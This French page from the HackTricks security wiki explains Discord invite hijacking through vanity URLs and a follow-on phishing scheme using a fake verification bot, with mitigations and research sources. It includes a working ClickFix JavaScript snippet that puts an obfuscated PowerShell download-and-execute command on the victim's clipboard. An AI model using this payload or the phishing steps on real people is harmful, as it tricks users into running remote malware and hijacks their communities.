# Détournement d’invitations Discord

{{#include ../../banners/hacktricks-training.md}}

La vulnérabilité du système d’invitations de Discord permet aux threat actors de revendiquer des codes d’invitation expirés ou supprimés (temporaires, permanents ou custom vanity) en tant que nouveaux liens vanity sur n’importe quel serveur avec un Level 3 Boost. En normalisant tous les codes en minuscules, les attackers peuvent pré-enregistrer des codes d’invitation connus et détourner silencieusement le trafic dès que le lien d’origine expire ou que le serveur source perd son boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Types d’invitations et risque de détournement

| Type d’invitation       | Peut être détournée ? | Condition / Commentaires                                                                                       |
|-------------------------|------------------------|------------------------------------------------------------------------------------------------------------|
| Lien d’invitation temporaire | ✅          | Après expiration, le code redevient disponible et peut être réenregistré en tant qu’URL vanity par un serveur boosté. |
| Lien d’invitation permanent | ⚠️          | S’il est supprimé et composé uniquement de lettres minuscules et de chiffres, le code peut redevenir disponible.        |
| Lien vanity personnalisé    | ✅          | Si le serveur d’origine perd son Level 3 Boost, son invitation vanity devient disponible pour une nouvelle inscription.    |

## Étapes d’exploitation

1. Reconnaissance
- Surveiller les sources publiques (forums, réseaux sociaux, channels Telegram) à la recherche de liens d’invitation correspondant au modèle `discord.gg/{code}` ou `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Collecter les codes d’invitation intéressants (temporaires ou vanity).
2. Pré-enregistrement
- Créer ou utiliser un serveur Discord existant disposant des privilèges Level 3 Boost.
- Dans **Server Settings → Vanity URL**, tenter d’attribuer le code d’invitation ciblé. S’il est accepté, le code est réservé par le serveur malveillant.
3. Activation du détournement
- Pour les invitations temporaires, attendre que l’invitation d’origine expire (ou la supprimer manuellement si vous contrôlez la source).
- Pour les codes contenant des majuscules, la variante en minuscules peut être revendiquée immédiatement, mais la redirection ne s’active qu’après expiration.
4. Redirection silencieuse
- Les utilisateurs qui visitent l’ancien lien sont automatiquement envoyés vers le serveur contrôlé par l’attacker une fois le détournement actif.

## Phishing via un serveur Discord

1. Restreindre les channels du serveur afin que seul un channel **#verify** soit visible.<sup>[[1]](#references)</sup>
2. Déployer un bot (par ex., **Safeguard#0786**) pour inviter les nouveaux arrivants à se vérifier via OAuth2.
3. Le bot redirige les utilisateurs vers un site de phishing (par ex., `captchaguard.me`) sous couvert d’un CAPTCHA ou d’une étape de vérification.
4. Implémenter l’astuce UX **ClickFix** :
- Afficher un message indiquant que le CAPTCHA ne fonctionne pas.
- Guider les utilisateurs pour ouvrir la boîte de dialogue **Win+R**, coller une commande PowerShell préchargée et appuyer sur Entrée.

### Exemple d’injection dans le presse-papiers avec ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Cette approche évite les téléchargements directs de fichiers et exploite des éléments d’interface familiers pour réduire la suspicion des utilisateurs.<sup>[[1]](#references)</sup>

## Mesures d’atténuation

- Utiliser des liens d’invitation permanents contenant au moins une lettre majuscule ou un caractère non alphanumérique (n’expirant jamais et non réutilisables).<sup>[[1]](#references)</sup>
- Faire régulièrement tourner les codes d’invitation et révoquer les anciens liens.
- Surveiller le statut des boosts du serveur Discord et les revendications d’URL vanity.
- Former les utilisateurs à vérifier l’authenticité du serveur et à éviter d’exécuter des commandes collées depuis le presse-papiers.

## Références

- [1] [De la confiance à la menace : des invitations Discord détournées utilisées pour diffuser des malwares en plusieurs étapes](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Lien d’invitation personnalisé – Assistance Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
